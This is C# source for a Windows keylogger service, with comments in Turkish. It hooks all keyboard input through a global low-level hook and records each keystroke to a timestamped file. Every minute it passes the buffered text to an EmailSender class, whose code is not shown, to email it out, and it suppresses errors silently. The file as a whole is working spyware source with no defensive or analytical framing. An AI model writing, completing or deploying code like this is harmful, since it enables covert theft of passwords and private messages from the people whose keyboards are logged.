using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Timers;

namespace KeyloggerApp
{
    public class KeyloggerService
    {
        // Windows API için gerekli import'lar
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        
        private LowLevelKeyboardProc _proc;
        private IntPtr _hookID = IntPtr.Zero;
        private StringBuilder _logBuffer = new StringBuilder();
        private string _logFilePath;
        private System.Timers.Timer _emailTimer;
        private EmailSender _emailSender;
        
        public KeyloggerService()
        {
            // Log dosyasını oluştur
            string logDirectory = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Logs");
            if (!Directory.Exists(logDirectory))
            {
                Directory.CreateDirectory(logDirectory);
            }
            
            _logFilePath = Path.Combine(logDirectory, $"keylog_{DateTime.Now:yyyyMMdd_HHmmss}.txt");
            _proc = HookCallback;
            _emailSender = new EmailSender();
        }
        
        public void Start()
        {
            _hookID = SetHook(_proc);
            if (_hookID == IntPtr.Zero)
            {
                WriteLog("\n[HATA] Klavye hook kurulamadı. Yönetici olarak çalıştırmayı deneyin.\n");
            }
            
            // 1 dakikada bir email gönder (60000 ms)
            _emailTimer = new System.Timers.Timer(60000); // 1 dakika
            _emailTimer.Elapsed += OnEmailTimerElapsed;
            _emailTimer.AutoReset = true;
            _emailTimer.Enabled = true;
            
            WriteLog("Keylogger başlatıldı: " + DateTime.Now.ToString());
        }
        
        public void Stop()
        {
            UnhookWindowsHookEx(_hookID);
            _emailTimer?.Stop();
            _emailTimer?.Dispose();
            WriteLog("Keylogger durduruldu: " + DateTime.Now.ToString());
        }
        
        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule? curModule = curProcess.MainModule)
            {
                if (curModule != null)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
                return IntPtr.Zero;
            }
        }
        
        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string keyText = GetKeyText(vkCode);
                
                _logBuffer.Append(keyText);
                WriteLog(keyText);
            }
            
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        
        private string GetKeyText(int vkCode)
        {
            Keys key = (Keys)vkCode;
            
            // Özel tuşları formatla
            switch (key)
            {
                case Keys.Space:
                    return " ";
                case Keys.Enter:
                    return "\n[ENTER]\n";
                case Keys.Tab:
                    return "[TAB]";
                case Keys.Back:
                    return "[BACKSPACE]";
                case Keys.Delete:
                    return "[DELETE]";
                case Keys.Escape:
                    return "[ESC]";
                case Keys.ShiftKey:
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                    return "[SHIFT]";
                case Keys.ControlKey:
                case Keys.LControlKey:
                case Keys.RControlKey:
                    return "[CTRL]";
                case Keys.Alt:
                    return "[ALT]";
                case Keys.CapsLock:
                    return "[CAPSLOCK]";
                default:
                    if (key >= Keys.A && key <= Keys.Z)
                    {
                        return key.ToString();
                    }
                    else if (key >= Keys.D0 && key <= Keys.D9)
                    {
                        return key.ToString().Replace("D", "");
                    }
                    else if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
                    {
                        return (key - Keys.NumPad0).ToString();
                    }
                    else
                    {
                        return $"[{key}]";
                    }
            }
        }
        
        private void WriteLog(string text)
        {
            try
            {
                File.AppendAllText(_logFilePath, text);
            }
            catch (Exception ex)
            {
                // Hata durumunda sessizce devam et
                Debug.WriteLine($"Log yazma hatası: {ex.Message}");
            }
        }
        
        private void OnEmailTimerElapsed(object? sender, ElapsedEventArgs e)
        {
            if (_logBuffer.Length > 0)
            {
                string logContent = _logBuffer.ToString();
                _emailSender.SendLogEmail(logContent, _logFilePath);
                _logBuffer.Clear();
            }
        }
    }
}


